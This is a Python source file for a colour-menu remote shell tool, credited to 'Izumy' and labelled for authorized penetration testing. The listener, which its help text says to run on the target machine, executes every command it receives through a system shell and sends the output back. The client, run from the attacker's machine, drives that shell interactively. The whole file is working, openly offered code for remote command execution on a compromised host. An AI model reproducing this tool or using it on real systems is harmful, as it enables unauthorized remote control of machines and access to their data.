#!/usr/bin/env python3
"""
Enhanced Python Reverse Shell with Beautiful UI
Author: Izumy
For authorized penetration testing only
"""

import socket
import subprocess
import sys
import argparse
import os
import time
import logging
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ReverseShellTool:
    def __init__(self):
        self.setup_logging()
        self.show_banner()
        
    def setup_logging(self):
        """Configure logging system"""
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filename='reverse_shell.log',
            filemode='a'
        )
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        logging.getLogger('').addHandler(console)
        
    def show_banner(self):
        """Display tool banner"""
        banner = f"""
        {Style.RESET_ALL}
        """
        print(banner)

    def validate_port(self, port):
        """Validate port number range"""
        return 1 <= port <= 65535

    def validate_ip(self, ip):
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def show_menu(self):
        """Display beautiful menu with icons"""
        menu = f"""
{Fore.YELLOW}╔════════════════════════════════════════════════╗
{Fore.YELLOW}║           {Fore.CYAN}🚀 REVERSE SHELL MENU {Fore.YELLOW}               ║
{Fore.YELLOW}║           {Fore.CYAN}      Author: Izumy {Fore.YELLOW}                 ║
{Fore.YELLOW}╠════════════════════════════════════════════════╣
{Fore.YELLOW}║ {Fore.GREEN}1. {Fore.WHITE}Start Listener {Fore.BLUE}({Fore.WHITE}👂 Listen for connections{Fore.BLUE}){Fore.YELLOW}  ║
{Fore.YELLOW}║ {Fore.GREEN}2. {Fore.WHITE}Connect to Target {Fore.BLUE}({Fore.WHITE}🔌 Initiate connection{Fore.BLUE}){Fore.YELLOW}  ║
{Fore.YELLOW}║ {Fore.GREEN}3. {Fore.WHITE}Show Help {Fore.BLUE}({Fore.WHITE}❓ Display help{Fore.BLUE}){Fore.YELLOW}                 ║
{Fore.YELLOW}║ {Fore.GREEN}4. {Fore.WHITE}Exit {Fore.BLUE}({Fore.WHITE}🚪 Quit tool{Fore.BLUE}){Fore.YELLOW}                         ║
{Fore.YELLOW}╚════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(menu)

    def show_status(self, message, status_type="info"):
        """Show colored status messages"""
        icons = {
            "info": f"{Fore.BLUE}ℹ",
            "success": f"{Fore.GREEN}✔",
            "warning": f"{Fore.YELLOW}⚠",
            "error": f"{Fore.RED}✖"
        }
        print(f"{icons.get(status_type, '')} {message} {Style.RESET_ALL}")

    def execute_command(self, command):
        """Execute command with comprehensive error handling"""
        try:
            if command.lower().strip() == 'exit':
                return "exit"
                
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"{Fore.GREEN}✓{Style.RESET_ALL} Changed directory to: {os.getcwd()}"
                except FileNotFoundError:
                    return f"{Fore.RED}✗{Style.RESET_ALL} Directory not found: {path}"
                except PermissionError:
                    return f"{Fore.RED}✗{Style.RESET_ALL} Permission denied"
                except Exception as e:
                    return f"{Fore.RED}✗{Style.RESET_ALL} Error: {str(e)}"

            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            output, error = process.communicate()
            
            if process.returncode != 0:
                return f"{Fore.RED}✗{Style.RESET_ALL} Error ({process.returncode}): {error.decode().strip()}"
            return f"{Fore.GREEN}✓{Style.RESET_ALL} " + output.decode('utf-8', errors='replace')
            
        except subprocess.SubprocessError as e:
            return f"{Fore.RED}✗{Style.RESET_ALL} Subprocess error: {str(e)}"
        except UnicodeDecodeError:
            return f"{Fore.RED}✗{Style.RESET_ALL} Error decoding output (possibly binary data)"
        except Exception as e:
            return f"{Fore.RED}✗{Style.RESET_ALL} Unexpected error: {str(e)}"

    def connect_to_host(self, host, port, max_retries=3):
        """Connect to listener with retry mechanism"""
        for attempt in range(max_retries):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                logging.info(f"Connected to {host}:{port}")
                return s
            except socket.timeout:
                logging.warning(f"Timeout connecting to {host}:{port} (attempt {attempt+1})")
                if attempt == max_retries - 1:
                    self.show_status(f"Timeout: Couldn't connect to {host}:{port}", "error")
                    sys.exit(1)
            except socket.gaierror:
                self.show_status("Error: Invalid IP/Hostname", "error")
                sys.exit(1)
            except ConnectionRefusedError:
                logging.warning(f"Connection refused by {host}:{port} (attempt {attempt+1})")
                if attempt == max_retries - 1:
                    self.show_status(f"Connection refused by {host}:{port}", "error")
                    self.show_status("Make sure listener is running on target", "info")
                    sys.exit(1)
            except Exception as e:
                logging.error(f"Connection error: {str(e)}")
                if attempt == max_retries - 1:
                    self.show_status(f"Connection error: {str(e)}", "error")
                    sys.exit(1)
            time.sleep(2)

    def start_listener(self, port):
        """Start listener with comprehensive error handling"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            try:
                s.bind(('0.0.0.0', port))
            except PermissionError:
                self.show_status(f"Error: Can't bind to port {port} (need root?)", "error")
                sys.exit(1)
            except OSError as e:
                if e.errno == 98:  # Address already in use
                    self.show_status(f"Port {port} is already in use", "error")
                    self.show_status("Try another port or kill the process using it", "info")
                    sys.exit(1)
                raise e
                
            s.listen(5)
            self.show_status(f"Listening on 0.0.0.0:{port} (CTRL+C to exit)", "info")
            logging.info(f"Listener started on port {port}")
            
            while True:
                try:
                    conn, addr = s.accept()
                    self.show_status(f"Connection from {addr[0]}:{addr[1]}", "success")
                    logging.info(f"New connection from {addr[0]}:{addr[1]}")
                    
                    while True:
                        try:
                            command = conn.recv(1024).decode().strip()
                            if not command:
                                break
                                
                            output = self.execute_command(command)
                            conn.send(output.encode())
                            
                        except ConnectionResetError:
                            self.show_status(f"Connection closed by {addr[0]}", "warning")
                            logging.info(f"Connection closed by {addr[0]}")
                            break
                        except Exception as e:
                            self.show_status(f"Error handling command: {str(e)}", "error")
                            logging.error(f"Command handling error: {str(e)}")
                            conn.send(f"[!] Server error: {str(e)}".encode())
                            break
                            
                except KeyboardInterrupt:
                    self.show_status("\nShutting down listener...", "info")
                    logging.info("Listener shutdown by user")
                    break
                except Exception as e:
                    self.show_status(f"Error accepting connection: {str(e)}", "error")
                    logging.error(f"Connection acceptance error: {str(e)}")
                    continue
                    
        except Exception as e:
            logging.critical(f"Listener fatal error: {str(e)}")
            self.show_status(f"Fatal error: {str(e)}", "error")
        finally:
            s.close()

    def interactive_shell(self, conn, addr):
        """Interactive shell with beautiful prompt"""
        try:
            while True:
                try:
                    prompt = f"\n{Fore.BLUE}┌─[{Fore.GREEN}RSH{Fore.BLUE}]─[{Fore.YELLOW}{addr[0]}{Fore.BLUE}]─[{Fore.CYAN}{os.getcwd()}{Fore.BLUE}]\n└──╼ {Fore.WHITE}"
                    command = input(prompt).strip()
                    
                    if not command:
                        continue
                        
                    conn.send(command.encode())
                    if command.lower() == 'exit':
                        break
                        
                    response = conn.recv(8192).decode()
                    print(response)
                    
                except KeyboardInterrupt:
                    self.show_status("Session interrupted", "warning")
                    conn.send(b'exit')
                    break
                except Exception as e:
                    self.show_status(f"Shell error: {str(e)}", "error")
                    break
                    
        except Exception as e:
            self.show_status(f"Fatal shell error: {str(e)}", "error")
        finally:
            conn.close()

def main():
    tool = ReverseShellTool()
    
    while True:
        tool.show_menu()
        choice = input(f"{Fore.CYAN}↳ Select option [1-4]: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            port = input(f"{Fore.CYAN}↳ Enter port [4444]: {Style.RESET_ALL}") or "4444"
            try:
                port = int(port)
                if not tool.validate_port(port):
                    tool.show_status("Invalid port number (must be 1-65535)", "error")
                    continue
                tool.start_listener(port)
            except ValueError:
                tool.show_status("Invalid port number (must be numeric)", "error")
                
        elif choice == "2":
            host = input(f"{Fore.CYAN}↳ Enter target IP: {Style.RESET_ALL}").strip()
            if not tool.validate_ip(host):
                tool.show_status("Invalid IP address format", "error")
                continue
            port = input(f"{Fore.CYAN}↳ Enter port [4444]: {Style.RESET_ALL}") or "4444"
            try:
                port = int(port)
                if not tool.validate_port(port):
                    tool.show_status("Invalid port number (must be 1-65535)", "error")
                    continue
                    
                try:
                    conn = tool.connect_to_host(host, port)
                    addr = (host, port)
                    tool.interactive_shell(conn, addr)
                except Exception as e:
                    tool.show_status(f"Connection failed: {str(e)}", "error")
                    
            except ValueError:
                tool.show_status("Invalid port number (must be numeric)", "error")
                
        elif choice == "3":
            print(f"""
{Fore.YELLOW}╔══════════════════════════════════════════╗
{Fore.YELLOW}║           {Fore.CYAN}🆘 HELP & USAGE {Fore.YELLOW}               ║
{Fore.YELLOW}╠══════════════════════════════════════════╣
{Fore.YELLOW}║ {Fore.GREEN}1. Start Listener: {Fore.WHITE}Run on target machine    {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.GREEN}2. Connect: {Fore.WHITE}Run on attacker machine      {Fore.YELLOW}║
{Fore.YELLOW}║ {Fore.GREEN}Commands: {Fore.WHITE}                               {Fore.YELLOW}║
{Fore.YELLOW}║   {Fore.CYAN}• sysinfo {Fore.WHITE}- Show system info           {Fore.YELLOW}║
{Fore.YELLOW}║   {Fore.CYAN}• cd {Fore.WHITE}- Change directory               {Fore.YELLOW}║
{Fore.YELLOW}║   {Fore.CYAN}• exit {Fore.WHITE}- Close connection             {Fore.YELLOW}║
{Fore.YELLOW}╚══════════════════════════════════════════╝
{Style.RESET_ALL}""")
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "4":
            tool.show_status("Exiting tool...", "info")
            sys.exit(0)
            
        else:
            tool.show_status("Invalid option selected", "error")

if __name__ == '__main__':
    main()
